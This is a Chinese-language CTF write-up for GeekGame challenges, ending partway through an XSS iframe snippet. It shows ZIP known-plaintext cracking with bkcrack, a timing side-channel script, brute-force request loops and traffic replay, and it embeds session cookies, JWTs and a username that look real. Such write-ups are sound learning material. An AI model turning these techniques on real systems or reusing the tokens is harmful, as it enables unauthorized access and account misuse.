# Writeup

[toc]

## prob23-signin

zhs9切gif拿flag

## prob18-trivia

#1 ccdoc

#2 内核源码，`make menuconfig`看title

#3 googlehack

#4 github拖下来运行

#5 看审查元素

#6 googlehack

## prob05-zserver

### flag1

rz --tcp下载

### flag2

pcap拿包pwntools起server重放sz流量，rz --tcp下载

```python
from pwn import *

context.log_level = 'debug'
p = listen(7777)

with open('stream', 'r') as f:
    a = f.read()
    a = a.splitlines()
def ss(line):
    p.send(unhex(a[line]))
for i in a:
    p.send(unhex(i))
p.shutdown()
p.close()
```

## prob24-password

### flag1

下所有包，找同样大小文件

```python
from os import system
import requests
import re

def download(version):
    system(f'wget https://chromedriver.storage.googleapis.com/{version}/chromedriver_linux64.zip -O ./packet/{version}')

def getPage(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.text
    else:
        return None

res = getPage('https://chromedriver.chromium.org/downloads')
res = re.findall(r'ChromeDriver (\d\d.0.\d{4}.\d{2})', res)
for i in res:
    download(i)
```

```powershell
D:\Desktop\tools\Misc\zip\bkcrack-1.5.0-win64\bkcrack.exe -c chromedriver_linux64.zip -p .\89.0.4389.23.zip -C .\challenge_1.zip > 1.log
```

```powershell
D:\Desktop\tools\Misc\zip\bkcrack-1.5.0-win64\bkcrack.exe -c flag1.txt -k 71cc30e9 01d2f031 930da6c2 -C .\challenge_1.zip -d flag
```

### flag2

pcapng包6-0x18字节一样

```powershell
D:\Desktop\tools\Misc\zip\bkcrack-1.5.0-win64\bkcrack.exe -c flag2.pcapng -p .\pcap -C .\challenge_2.zip -o 6 > 2.log
```

```powershell
D:\Desktop\tools\Misc\zip\bkcrack-1.5.0-win64\bkcrack.exe -c flag2.pcapng -k f3f93bcb 9dcb093b 80172703 -C .\challenge_2.zip -d flag2.pcapng
```

## prob16-darkroom

### flag1

#### 预期

h到san120+，trinket冲关

```python
from pwn import *


def login():
    p.sendlineafter(b'token: ', b'118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==')
def cmd(line, *kwargs):
    p.sendlineafter(b']: ', line.encode())
    if kwargs:
        cmd(*kwargs)
def cmdline(line):
    for i in line:
        if i == 'p':
            cmd('pickup key')
        elif i == 'u':
            cmd('usewith key door')
        elif i == 't':
            cmd('pickup trinket')
        elif i == 'T':
            cmd('use trinket')
        else:
            cmd(i)
context.log_level = 'debug'

while True:
    sleep(2)
    p = remote('prob16.geekgame.pku.edu.cn', 10016)
    login()
    cmd('newgame', '1')
    p.sendlineafter(b') ', b'y')
    succ = True
    while True:
        cmd('h')
        res = p.recvuntil(b'Sanity: ')
        p.recvuntil(b'(')
        s = int(p.recvuntil(b'%', drop=True))
        if s > 120 or s <= 0:
            break
    if s <= 0:
        p.close()
        continue
    cmdline('nnepwsseeetwsuswwwnpseeennwwnnwwuTn')
    res = p.recvuntil(b', you', timeout=1)
    if b'or higher sanity' in res:
        p.close()
        continue
    p.interactive()
```

脸黑一晚上出不来

#### 非预期

拿到key后开门++san

### flag2

报错侧信道

```python
from pwn import *
from time import time


def login():
    p.sendlineafter(b'token: ', b'118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==')
def cmd(line, *kwargs):
    p.sendlineafter(b']: ', line.encode())
    if kwargs:
        cmd(*kwargs)
def cmdline(line):
    for i in line:
        if i == 'p':
            cmd('pickup key')
        elif i == 'u':
            cmd('usewith key door')
        elif i == 't':
            cmd('pickup trinket')
        elif i == 'T':
            cmd('use trinket')
        else:
            cmd(i)
context.log_level = 'debug'


p = remote('prob16.geekgame.pku.edu.cn', 10016)
login()
cmd('newgame', '1')
p.sendlineafter(b') ', b'y')

cmdline('nnwws')
cmd('getflag')

flag = ''
def timecmd(num):
    p.recvuntil(b'): ')
    p.sendline(num)
    t1 = time()
    p.recvuntil(b'Wrong')
    t2 = time()
    return t2 - t1
tt = []
while True:
    t0 = timecmd(b'0')
    tt.append(t0)

p.interactive()
```

```python
# tt = [0.006773233413696289, 1.0084903240203857, 0.0686039924621582, 1.016552209854126, 1.0104806423187256, 1.0535590648651123, 1.0327351093292236, 1.0076136589050293, 0.050615549087524414, 1.0071520805358887, 0.006471395492553711, 0.005280494689941406, 1.0086331367492676, 1.0489561557769775, 1.0095410346984863, 1.0166070461273193, 0.06125807762145996, 0.008855819702148438, 0.008431196212768555, 1.0092227458953857, 1.0094919204711914, 0.07058930397033691, 0.008441925048828125, 1.0089664459228516, 0.008534431457519531, 0.007725238800048828, 0.007254838943481445, 1.0077414512634277, 0.0581209659576416, 1.0833015441894531, 1.025437355041504, 1.009887456893921, 0.05079817771911621, 0.006433010101318359, 1.0102131366729736, 1.040877342224121, 1.0529074668884277, 0.006795167922973633, 0.005530118942260742, 1.0322620868682861, 0.00621342658996582, 1.007209300994873, 0.04901528358459473, 1.00876784324646, 0.00615692138671875, 0.029795408248901367, 0.006987094879150391, 1.0079214572906494, 0.04889965057373047, 0.006232738494873047, 0.006312131881713867, 1.031905174255371, 1.0099351406097412, 0.050264835357666016, 1.0098905563354492, 1.0093979835510254, 0.05265402793884277, 0.006418466567993164, 0.0074689388275146484, 1.0083122253417969, 1.9173028469085693, 0.01642632484436035, 1.0717253684997559, 1.007094383239746, 0.06043601036071777, 1.007880687713623, 0.008608341217041016, 1.006800651550293, 0.047582387924194336, 0.0042552947998046875, 0.005569934844970703, 1.031658411026001, 0.006047964096069336, 1.0097224712371826, 1.0518674850463867, 0.007086038589477539, 0.03262019157409668, 0.006585597991943359, 1.0092628002166748, 1.008523941040039, 0.04937243461608887, 0.0072803497314453125, 0.026166915893554688, 0.008095741271972656, 1.0086839199066162, 1.011124849319458, 1.0523746013641357, 1.00775146484375, 0.02650928497314453, 1.0082952976226807, 0.04999041557312012, 1.022484540939331, 0.02611565589904785, 0.0073320865631103516, 1.0146074295043945, 1.0515742301940918, 0.008330821990966797, 1.03126859664917, 1.0109786987304688, 1.0513114929199219, 1.0115876197814941, 1.0728161334991455, 0.018439292907714844, 1.0114679336547852, 0.0508577823638916, 1.0080523490905762, 0.007169961929321289, 1.015779972076416, 0.0665125846862793, 0.007913589477539062, 1.0079545974731445, 1.009308099746704, 0.04879260063171387, 1.01015305519104, 1.0146739482879639, 1.050994634628296, 0.006925821304321289, 0.0057604312896728516, 1.0095634460449219, 1.011061191558838, 0.05124330520629883, 0.006627082824707031, 1.0105338096618652, 1.0083489418029785, 1.0742526054382324, 0.007686614990234375, 0.008192777633666992, 1.0083775520324707, 0.007132530212402344, 1.0090372562408447, 0.06756424903869629, 1.0112135410308838, 0.007354736328125, 0.009935140609741211, 1.010023832321167, 1.0713751316070557, 0.014240026473999023, 0.0065555572509765625, 0.007770538330078125, 1.0101311206817627, 1.0088682174682617, 0.061220407485961914, 1.015108585357666, 1.011368989944458, 0.05159878730773926, 0.027655839920043945, 0.009288311004638672, 1.0090444087982178, 1.0106661319732666, 0.053092002868652344, 0.025240659713745117, 1.0186073780059814, 0.00825047492980957, 1.0118393898010254, 0.0677947998046875, 0.005745649337768555, 0.006720542907714844, 0.008069753646850586, 1.0083858966827393, 1.0085704326629639, 0.07031798362731934, 0.007917642593383789, 0.008550882339477539, 0.007318735122680664, 1.010849952697754, 0.0068111419677734375, 1.0821678638458252, 1.0084657669067383, 0.04918789863586426, 1.0351462364196777, 1.0110113620758057, 0.05224800109863281, 0.007521152496337891, 0.031092405319213867, 1.0110528469085693, 1.0105509757995605, 0.08575820922851562, 1.0092499256134033, 1.0082628726959229, 1.0100793838500977, 1.0523149967193604, 1.007819414138794, 0.03004622459411621, 1.0089969635009766, 0.04968714714050293, 1.0118780136108398, 1.0078670978546143, 0.04887080192565918, 0.009298324584960938, 1.0083680152893066, 1.0121972560882568, 1.0635762214660645, 0.006654024124145508, 1.0082387924194336, 0.0077972412109375, 0.007495403289794922, 0.008096694946289062, 1.0093998908996582, 1.0643620491027832, 0.009050607681274414, 0.010306358337402344, 0.008304119110107422, 0.00738978385925293, 0.006253242492675781, 1.0098462104797363, 0.0064771175384521484, 0.0065381526947021484, 1.0240516662597656, 0.05032944679260254, 0.009182214736938477, 0.007004261016845703, 1.0099396705627441, 0.007982492446899414, 1.0085639953613281, 1.0535149574279785, 1.0158922672271729, 0.015613794326782227, 1.0083129405975342, 1.0542278289794922, 1.009190559387207, 1.0082769393920898, 1.0519182682037354, 0.0074558258056640625, 1.010369062423706, 0.027745485305786133, 0.007174968719482422, 0.0064239501953125, 1.0111820697784424, 0.04961729049682617, 0.02871227264404297, 1.0094430446624756, 1.0089104175567627, 0.05383133888244629, 1.0395736694335938, 0.008167028427124023, 1.009533166885376, 0.007269859313964844, 0.007162809371948242, 0.00871133804321289, 1.01210355758667, 0.05176353454589844, 0.007266044616699219, 1.0107693672180176, 1.0090820789337158, 0.04739189147949219, 1.0374939441680908, 0.0057981014251708984, 1.0091214179992676, 0.05037093162536621, 0.0051119327545166016, 0.007891654968261719, 1.085864543914795, 1.0093019008636475, 0.008378267288208008, 0.028599262237548828, 1.0088365077972412, 0.05166363716125488, 0.007250070571899414, 0.006592273712158203, 0.029962539672851562, 0.006838560104370117, 1.0085546970367432, 1.0099961757659912, 0.050763607025146484, 0.03209710121154785, 1.0900092124938965, 1.0179684162139893, 0.006830692291259766, 0.005520343780517578, 1.0124015808105469, 1.0503172874450684, 1.0616455078125, 0.02077031135559082, 1.014777421951294, 1.0115931034088135, 1.0524718761444092, 1.009042739868164, 1.0130767822265625, 0.07297444343566895, 1.0084824562072754, 0.006891965866088867, 1.0093300342559814, 0.05160164833068848, 1.1010146141052246, 0.030271291732788086, 1.0097477436065674, 0.007954835891723633, 1.008216381072998, 0.05074143409729004, 1.0081617832183838, 1.038158893585205, 1.0511069297790527, 1.0087249279022217, 0.007291078567504883, 1.0101003646850586, 1.0562677383422852, 0.0078277587890625, 1.0082461833953857, 0.007999658584594727, 0.01012873649597168, 1.066047191619873, 1.0123796463012695, 0.0702824592590332, 1.0101854801177979, 0.007542133331298828, 1.008810043334961, 1.0528981685638428, 0.013542413711547852, 1.0221271514892578, 1.0104711055755615, 1.0565102100372314, 1.013810157775879, 0.023732662200927734, 1.0128419399261475, 1.0565340518951416, 1.0106959342956543, 0.00620722770690918, 0.02900528907775879, 1.01088547706604, 1.0516040325164795, 0.006073951721191406, 1.009119987487793, 0.007599830627441406, 0.023772478103637695, 0.007512331008911133, 0.005571603775024414, 1.0079078674316406, 1.047466516494751, 0.009786128997802734, 0.03084850311279297, 0.006582498550415039, 1.008887767791748, 1.0529277324676514, 0.009558916091918945, 1.0335488319396973, 1.0092992782592773, 0.051245689392089844, 0.006267547607421875, 1.0085945129394531, 1.0201997756958008, 0.05020332336425781, 0.005074024200439453, 1.0113821029663086]
tt = [1.027726650238037, 0.006742238998413086, 1.0086541175842285, 1.0088465213775635, 1.3673477172851562, 1.0823652744293213, 1.0085983276367188, 0.005911111831665039, 1.0089256763458252, 0.010286808013916016, 0.0077555179595947266, 1.0403192043304443, 1.0303385257720947, 1.0087692737579346, 1.007699966430664, 0.005594015121459961, 0.009270191192626953, 0.030980587005615234, 1.0085170269012451, 1.0931243896484375, 0.012738704681396484, 0.006658792495727539, 1.0074541568756104, 0.0049359798431396484, 0.0053021907806396484, 0.005869865417480469, 1.009538173675537, 0.006272792816162109, 1.008476972579956, 1.0081572532653809, 1.0090794563293457, 0.00783228874206543, 0.005981922149658203, 1.0096118450164795, 1.0162653923034668, 1.0102603435516357, 0.0063173770904541016, 0.008939743041992188, 1.072197675704956, 0.01844191551208496, 1.008934497833252, 0.007520914077758789, 1.0118379592895508, 0.025876283645629883, 0.006285905838012695, 0.008776426315307617, 1.0096874237060547, 0.007237911224365234, 0.007153511047363281, 0.007888317108154297, 1.0401151180267334, 1.0170412063598633, 0.008778810501098633, 1.0294859409332275, 1.0092408657073975, 0.013546943664550781, 0.034444332122802734, 0.00791311264038086, 1.010629415512085, 1.0630967617034912, 0.023843050003051758, 1.0102362632751465, 1.009432315826416, 0.006550788879394531, 1.010002851486206, 0.026998519897460938, 1.0117130279541016, 0.005780935287475586, 0.0061681270599365234, 0.0052683353424072266, 1.009369134902954, 0.02490830421447754, 1.0110650062561035, 1.0089504718780518, 0.005100250244140625, 0.005827665328979492, 0.005909919738769531, 1.0334980487823486, 1.0093069076538086, 0.005837440490722656, 0.005931377410888672, 0.0064809322357177734, 0.0062007904052734375, 1.0299935340881348, 1.1113648414611816, 1.010148525238037, 1.009718418121338, 0.00744938850402832, 1.0311527252197266, 0.006898641586303711, 1.009676218032837, 0.011703968048095703, 0.028298139572143555, 1.0099756717681885, 1.0091261863708496, 0.012080907821655273, 1.0080657005310059, 1.0134963989257812, 1.0267577171325684, 1.007934808731079, 1.0120747089385986, 0.016473770141601562, 1.016923427581787, 0.006369352340698242, 1.0081546306610107, 0.014570474624633789, 1.0073838233947754, 0.0270841121673584, 0.005629777908325195, 1.008288860321045, 1.0081124305725098, 0.005736351013183594, 1.0093574523925781, 1.0089867115020752, 1.0251619815826416, 0.029958009719848633, 0.0057582855224609375, 1.008244514465332, 1.011709213256836, 0.0059735774993896484, 0.030524253845214844, 1.0084283351898193, 1.0122852325439453, 1.0145556926727295, 0.005028963088989258, 0.030548095703125, 1.009209156036377, 0.0065572261810302734, 1.0085561275482178, 0.006091594696044922, 1.0085422992706299, 0.025504350662231445, 0.020392417907714844, 1.0089564323425293, 1.0085513591766357, 0.006248950958251953, 0.0058019161224365234, 0.0065155029296875, 1.0081210136413574, 1.008498191833496, 0.007393836975097656, 1.0082533359527588, 1.0079443454742432, 0.008432626724243164, 0.0055196285247802734, 0.005079984664916992, 1.032383680343628, 1.0083613395690918, 0.0065157413482666016, 0.005642414093017578, 1.0079660415649414, 0.03281092643737793, 1.0086724758148193, 0.0068264007568359375, 0.005532979965209961, 0.005408287048339844, 0.030618906021118164, 1.0072073936462402, 1.0087151527404785, 0.005864381790161133, 0.005894899368286133, 0.0054166316986083984, 0.030283689498901367, 1.0119187831878662, 0.005738258361816406, 1.0085911750793457, 1.0081193447113037, 0.029282331466674805, 1.0095319747924805, 1.00885009765625, 0.006046772003173828, 0.006646156311035156, 0.02830052375793457, 1.0096232891082764, 1.00972318649292, 0.005820512771606445, 1.0094854831695557, 1.031869888305664, 1.0077943801879883, 1.008436918258667, 1.0078847408294678, 0.005463123321533203, 1.0084762573242188, 0.00597834587097168, 1.0092713832855225, 1.0730512142181396, 0.01765751838684082, 0.00712275505065918, 1.0078630447387695, 1.0080883502960205, 1.0310475826263428, 0.007181644439697266, 1.0079598426818848, 0.009092330932617188, 0.005176067352294922, 0.0053064823150634766, 1.0324079990386963, 1.0184566974639893, 0.007891654968261719, 0.006134033203125, 0.024451494216918945, 0.006289958953857422, 0.005407571792602539, 1.023245096206665, 0.006384849548339844, 0.0072536468505859375, 1.0161733627319336, 0.010945320129394531, 0.009603023529052734, 0.00959467887878418, 1.009119987487793, 0.007509708404541016, 1.0083658695220947, 1.0110828876495361, 1.0079691410064697, 0.00694727897644043, 1.032724380493164, 1.0106329917907715, 1.0461432933807373, 1.0087482929229736, 1.0091698169708252, 0.006359100341796875, 1.0113701820373535, 0.006215810775756836, 0.006188154220581055, 0.006412029266357422, 1.0122594833374023, 0.017948150634765625, 0.006279468536376953, 1.0092110633850098, 1.0084984302520752, 0.007567644119262695, 1.0359289646148682, 0.008342981338500977, 1.0100345611572266, 0.007642269134521484, 0.007555484771728516, 0.025575876235961914, 1.0089986324310303, 0.008907318115234375, 0.008294820785522461, 1.0102097988128662, 1.008594274520874, 0.005696773529052734, 1.008662223815918, 0.007082939147949219, 1.0078563690185547, 0.013807058334350586, 0.028609275817871094, 0.0069005489349365234, 1.007995367050171, 1.0175893306732178, 0.007493495941162109, 0.012431859970092773, 1.0085151195526123, 0.006159067153930664, 0.028634309768676758, 0.0052297115325927734, 0.004503726959228516, 0.0054302215576171875, 1.008875846862793, 1.0149762630462646, 0.006505727767944336, 0.0052907466888427734, 1.0089855194091797, 1.0079405307769775, 0.006779909133911133, 0.00510096549987793, 1.035019874572754, 1.006680965423584, 1.0103681087493896, 0.006896018981933594, 1.0073282718658447, 1.0075185298919678, 1.016561508178711, 1.0079371929168701, 1.0082719326019287, 0.010776281356811523, 1.0333340167999268, 0.00972294807434082, 1.0082619190216064, 0.008009195327758789, 1.0117356777191162, 0.031193971633911133, 1.0080769062042236, 0.0052449703216552734, 1.0080695152282715, 0.009192466735839844, 1.0068631172180176, 1.0309686660766602, 1.006892442703247, 1.0075831413269043, 0.006583213806152344, 1.0128347873687744, 1.0090584754943848, 0.00899648666381836, 1.0092709064483643, 0.025979995727539062, 0.009218692779541016, 1.0100955963134766, 1.0345673561096191, 0.007909774780273438, 1.009294033050537, 0.014327526092529297, 1.0097923278808594, 1.0359983444213867, 0.018857479095458984, 1.0099987983703613, 1.0090196132659912, 1.0819921493530273, 1.0082218647003174, 0.0063707828521728516, 1.0158979892730713, 1.0099396705627441, 1.0076889991760254, 0.006863594055175781, 0.006076335906982422, 1.0083973407745361, 1.0097880363464355, 0.007208347320556641, 1.0122323036193848, 0.008359432220458984, 0.005595684051513672, 0.006593227386474609, 0.005884647369384766, 1.0116515159606934, 1.0088562965393066, 0.006864309310913086, 0.0057375431060791016, 0.007811546325683594, 1.0090665817260742, 1.0108356475830078, 0.011558294296264648, 1.0098707675933838, 1.0080950260162354, 0.0059604644775390625, 0.006809234619140625, 1.0386128425598145, 1.0099294185638428, 0.008715152740478516, 0.0067729949951171875, 1.0078024864196777, 1.0075030326843262]
flag = b''
for i in tt:
    if i > 1:
        flag += b'1'
    else:
        flag += b'0'
print(flag)
flag = flag + b'0'
print(int(flag[::-1], 2).to_bytes(150, 'little')[::-1])
print(len(flag))
```

## prob22-minecraft

### flag1 && flag2

NBTExplorer在Region找

## prob14-emoji

### flag1

```python
import requests
import re
import urllib

emojiset = set()
while True:
    burp0_url = "https://prob14.geekgame.pku.edu.cn:443/level1"
    burp0_cookies = {"Hm_lvt_c7896bb34c3be32ea17322b5412545c0": "1694146138", "hb_MA-B701-2FC93ACD9328_source": "entryhz.qiye.163.com", "anticheat_canary": "yrixvlthkj", "PORTALLANG": "zh", "_webvpn_key": "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMjMwMTExMDc1MSIsImlhdCI6MTY5NzUzMzI3MiwiZXhwIjoxNjk3NjE5NjcyfQ.CSWVj5ShdIWffIjzPmq92iaoFj24C9XvFR2LBIHOA-0", "webvpn_username": "2301110751%7C1697533272%7C38f816085a1ae2741bed7ba728d68d9103e519b8", "PLAY_SESSION": "eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMSIsInJlbWFpbmluZ19ndWVzc2VzIjoiNjQifSwibmJmIjoxNjk3NTc0MDIxLCJpYXQiOjE2OTc1NzQwMjF9.VOQ5RND5XTlw42P-X-8NNyT7aBuDSl6TTHSUrTyn8FM"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://prob14.geekgame.pku.edu.cn/?token=118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
    r =requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    x = re.findall("placeholder=\"(.*)\"", r.text)
    for i in x:
        for j in i:
            emojiset.add(j)
    if len(emojiset) == 128:
        break
print(emojiset)

ans = [0] * 64
for emoji in emojiset:
    burp0_url = "https://prob14.geekgame.pku.edu.cn:443/level1?guess={}".format(urllib.parse.quote(emoji)*64)
    # print(burp0_url)
    # exit()
    burp0_cookies = {"Hm_lvt_c7896bb34c3be32ea17322b5412545c0": "1694146138", "hb_MA-B701-2FC93ACD9328_source": "entryhz.qiye.163.com", "anticheat_canary": "yrixvlthkj", "PORTALLANG": "zh", "_webvpn_key": "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMjMwMTExMDc1MSIsImlhdCI6MTY5NzUzMzI3MiwiZXhwIjoxNjk3NjE5NjcyfQ.CSWVj5ShdIWffIjzPmq92iaoFj24C9XvFR2LBIHOA-0", "webvpn_username": "2301110751%7C1697533272%7C38f816085a1ae2741bed7ba728d68d9103e519b8", "PLAY_SESSION": "eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMSIsInJlbWFpbmluZ19ndWVzc2VzIjoiNjMifSwibmJmIjoxNjk3NTc0NDgxLCJpYXQiOjE2OTc1NzQ0ODF9.dh-b4Mxqx4XX3REnCVoNC0vi7YOOr4qYkFj7fFN09fw"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://prob14.geekgame.pku.edu.cn/level1?guess=%F0%9F%90%96", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}
    res = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    print(res.text)
    x = re.findall("results.push\(\"(.*)\"\)", res.text)[0]
    for i, c in enumerate(x):
        if c == '🟩':
            ans[i] = emoji

print(''.join(ans))
```

### flag2

jwt.io解cookie

### flag3

拿emojiset

```python
import requests
import re
import urllib

emojiset = set()

while True:
    burp0_url = "https://prob14.geekgame.pku.edu.cn:443/level3"
    burp0_cookies = {"Hm_lvt_c7896bb34c3be32ea17322b5412545c0": "1694146138", "hb_MA-B701-2FC93ACD9328_source": "entryhz.qiye.163.com", "anticheat_canary": "yrixvlthkj", "PORTALLANG": "zh", "_webvpn_key": "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMjMwMTExMDc1MSIsImlhdCI6MTY5NzUzMzI3MiwiZXhwIjoxNjk3NjE5NjcyfQ.CSWVj5ShdIWffIjzPmq92iaoFj24C9XvFR2LBIHOA-0", "webvpn_username": "2301110751%7C1697533272%7C38f816085a1ae2741bed7ba728d68d9103e519b8"}
    # burp0_cookies = {"Hm_lvt_c7896bb34c3be32ea17322b5412545c0": "1694146138", "hb_MA-B701-2FC93ACD9328_source": "entryhz.qiye.163.com", "anticheat_canary": "yrixvlthkj", "PORTALLANG": "zh", "_webvpn_key": "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMjMwMTExMDc1MSIsImlhdCI6MTY5NzUzMzI3MiwiZXhwIjoxNjk3NjE5NjcyfQ.CSWVj5ShdIWffIjzPmq92iaoFj24C9XvFR2LBIHOA-0", "webvpn_username": "2301110751%7C1697533272%7C38f816085a1ae2741bed7ba728d68d9103e519b8", "PLAY_SESSION": "eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMSIsInJlbWFpbmluZ19ndWVzc2VzIjoiNjQifSwibmJmIjoxNjk3NTc0MDIxLCJpYXQiOjE2OTc1NzQwMjF9.VOQ5RND5XTlw42P-X-8NNyT7aBuDSl6TTHSUrTyn8FM"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://prob14.geekgame.pku.edu.cn/?token=118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
    r =requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    # print(r.text)
    x = re.findall("placeholder=\"(.*)\"", r.text)
    for i in x:
        for j in i:
            emojiset.add(j)
    if len(emojiset) == 128:
        break
print(emojiset)
for each in list(emojiset):
    print(each)
```

锁cookie打

```python
import requests
import urllib
import re
# import requests

# burp0_url = "https://prob14.geekgame.pku.edu.cn:443/level3"
burp0_cookies = {"Hm_lvt_c7896bb34c3be32ea17322b5412545c0": "1694146138", "hb_MA-B701-2FC93ACD9328_source": "entryhz.qiye.163.com", "anticheat_canary": "yrixvlthkj", "PORTALLANG": "zh", "_webvpn_key": "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMjMwMTExMDc1MSIsImlhdCI6MTY5NzUzMzI3MiwiZXhwIjoxNjk3NjE5NjcyfQ.CSWVj5ShdIWffIjzPmq92iaoFj24C9XvFR2LBIHOA-0", "webvpn_username": "2301110751%7C1697533272%7C38f816085a1ae2741bed7ba728d68d9103e519b8"}
# burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://prob14.geekgame.pku.edu.cn/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}
# requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
def req(emoji):
    burp0_url = "https://prob14.geekgame.pku.edu.cn:443/level3?guess={}".format(urllib.parse.quote(emoji)*64)
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://prob14.geekgame.pku.edu.cn/level3", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}
    x = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, allow_redirects=False)
    return x

emojiset = set()
while True:
    burp0_url = "https://prob14.geekgame.pku.edu.cn:443/level3"
    # burp0_cookies = {"Hm_lvt_c7896bb34c3be32ea17322b5412545c0": "1694146138", "hb_MA-B701-2FC93ACD9328_source": "entryhz.qiye.163.com", "anticheat_canary": "yrixvlthkj", "PORTALLANG": "zh", "_webvpn_key": "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMjMwMTExMDc1MSIsImlhdCI6MTY5NzUzMzI3MiwiZXhwIjoxNjk3NjE5NjcyfQ.CSWVj5ShdIWffIjzPmq92iaoFj24C9XvFR2LBIHOA-0", "webvpn_username": "2301110751%7C1697533272%7C38f816085a1ae2741bed7ba728d68d9103e519b8", "PLAY_SESSION": "eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMSIsInJlbWFpbmluZ19ndWVzc2VzIjoiNjQifSwibmJmIjoxNjk3NTc0MDIxLCJpYXQiOjE2OTc1NzQwMjF9.VOQ5RND5XTlw42P-X-8NNyT7aBuDSl6TTHSUrTyn8FM"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://prob14.geekgame.pku.edu.cn/?token=118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}
    r =requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, allow_redirects=False)
    # print(r.text)
    x = re.findall("placeholder=\"(.*)\"", r.text)
    for i in x:
        for j in i:
            emojiset.add(j)
    if len(emojiset) == 128:
        break

ans = [0] * 64
for emoji in emojiset:
    x = req(emoji)
    
    print(x.text)
    x = re.findall("results.push\(\"(.*)\"\)", x.text)[0]
    for i, c in enumerate(x):
        if c == '🟩':
            ans[i] = emoji
print(emojiset)
print(ans)
print(''.join(ans))
```

## prob01-homepage

### flag1

xss用iframe绕跨域

```php
<iframe id="xss" src="http://prob99-y89fqs2b.geekgame.pku.edu.cn/admin/" onload="getflag()"></iframe>
